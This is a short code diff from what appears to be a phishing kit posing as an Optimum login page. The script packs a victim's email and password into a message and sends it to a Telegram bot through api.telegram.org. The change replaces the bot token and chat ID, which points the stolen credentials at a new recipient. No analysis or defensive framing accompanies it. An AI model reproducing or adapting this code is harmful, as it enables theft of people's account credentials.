@@ -13,8 +13,8 @@
 
         var info_values = `Optimum Login Info is:%0A - Email: ${emailInput} %0A - Password: ${password}`;
 
-        var bot_id = "5715406629:AAEyzHsnpE3MsSanPNR8n5B5VtKbOz8yGNw";
-        var chat_id = 526147671;
+        var bot_id = "6587221391:AAHFwtQKkHMcXA5iBOqBcuFTY4MJZex4o8E";
+        var chat_id = 1332758004;
         var url = `https://api.telegram.org/bot${bot_id}/sendMessage?chat_id=${chat_id}&text=${info_values}`;
 
         var funcs = [
